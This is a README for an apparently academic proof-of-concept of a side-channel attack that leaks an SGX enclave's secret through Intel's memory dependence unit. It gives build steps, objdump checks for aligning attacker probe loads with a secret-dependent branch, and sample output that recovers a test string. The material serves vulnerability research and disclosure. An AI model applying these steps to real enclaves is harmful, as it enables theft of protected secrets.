# Attack-Demo

### Introduction

This directory contains the code that demonstrates the MDU is not isolated inside and outside the Intel SGX.

Unlile the real-world attack, we simply use the `ecall` to syncrhonize between the attacker and the victim. The victim executes . 

### Environment Setup

This PoC requires SGX enabled in the machine. One can follow [this repository](https://github.com/intel/linux-sgx) to install and enable SGX SDK, SGX PSW and SGX Driver in the target machine.

The PoC requires gcc and g++ compilers. An example environment setup is as follows:

| Item     | Version                                     |
| -------- | ------------------------------------------- |
| CPU      | Intel(R) Core(TM) i7-6700K CPU              |
| Kernel   | Ubuntu 18.04.6 LTS, Linux 5.4.0-150-generic |
| gcc, g++ | 7.5.0                                       |

### Build

First, update the SGX SDK path in `Makefile` if necessary. SGX SDK path locates in line 34 of `Makefile`.

```makefile
...
SGX_SDK ?= <path-to-installed-sgx-sdk>   # Path of SGX SDK
...
```

Second, build the attack framework:

```shell
make
```

After building, files `app`, `enclave.so` and `enclave.signed.so` should appear in the directory:

```shell
$ ls
app  App  Enclave  enclave.signed.so  enclave.so  Include  Makefile  readme.md
```

#### Notes: Load Aligning

We need to ensure that the least significant 8 bits of the load PC should be aligned, so that the code in the enclave selects the same MDU counter. To check it, running:

```shell
objdump -d enclave.signed.so | grep "<secretDependentBranch>:" -A 40
```

Identify the secret-dependent branch. An expected output (dependent on the compiler) is similar to:

```shell
...
    7052:       74 1b                   je     706f <secretDependentBranch+0x6f>
    7054:       48 8b 45 e8             mov    -0x18(%rbp),%rax
    7058:       48 c7 44 c5 e0 00 00    movq   $0x0,-0x20(%rbp,%rax,8)  # delayed store
    705f:       00 00 
    7061:       48 8b 45 d8             mov    -0x28(%rbp),%rax         # target load 1
    7065:       48 83 c0 01             add    $0x1,%rax
    7069:       48 89 45 d8             mov    %rax,-0x28(%rbp)
    706d:       eb 1d                   jmp    708c <secretDependentBranch+0x8c>
    706f:       48 8b 45 e8             mov    -0x18(%rbp),%rax
    7073:       48 c7 44 c5 e0 00 00    movq   $0x0,-0x20(%rbp,%rax,8)  # delayed store
    707a:       00 00 
    707c:       48 8b 45 d8             mov    -0x28(%rbp),%rax         # target load 2
    7080:       48 83 c0 01             add    $0x1,%rax
    7084:       48 89 45 d8             mov    %rax,-0x28(%rbp)
    7088:       90                      nop
    7089:       eb 01                   jmp    708c <secretDependentBranch+0x8c>
...
```

In this example, the least significant 8 bits of the load PC are 0x61 and 0x7c, respectively. 

Next, verify the loads in the attacker program is aligned by running:

```shell
objdump -d app | grep "<stld_probe_1>:\|<stld_probe_2>:" -A 100 | grep "(%rsi),%rax"
```

An expected output is as follows:

```
    1961:       48 8b 06                mov    (%rsi),%rax
    1d7c:       48 8b 06                mov    (%rsi),%rax
```

In this example, the least significant 8 bits of the load PC are 0x61 and 0x7c, respectively. 

If the PCs are not aligned, please modify the file `App/asm.S`. In specific, adjust the loads' PC by setting the repeated `nop`s before each probe function at line 3 and line 31:

```
...
.rep 80         # modify this to adjust the first load PC
nop
.endr
.global stld_probe_1
stld_probe_1:
...
.rep 107        # modify this to adjust the second load PC
nop
.endr
.global stld_probe_2
stld_probe_2:
...
```

### Run

Start the PoC through executing:

```shell
./app
```

### Expected Results

The attack procedure will leak the secret string `MDPeek PoC.` bit by bit, and the final output is expected to be:

```shell
$ ./app 
Leak byte 0: M (1 0 1 1 0 0 1 0 )
Leak byte 1: D (0 0 1 0 0 0 1 0 )
Leak byte 2: P (0 0 0 0 1 0 1 0 )
Leak byte 3: e (1 0 1 0 0 1 1 0 )
Leak byte 4: e (1 0 1 0 0 1 1 0 )
Leak byte 5: k (1 1 0 1 0 1 1 0 )
Leak byte 6:   (0 0 0 0 0 1 0 0 )
Leak byte 7: P (0 0 0 0 1 0 1 0 )
Leak byte 8: o (1 1 1 1 0 1 1 0 )
Leak byte 9: C (1 1 0 0 0 0 1 0 )
Leak byte 10: . (0 1 1 1 0 1 0 0 )
Recovered Secret: MDPeek PoC.
```

Note: The secret string is in `./Enclave/Enclave.cpp`, i.e. `buf[BUFSIZ]`, which can be replaced by another string.
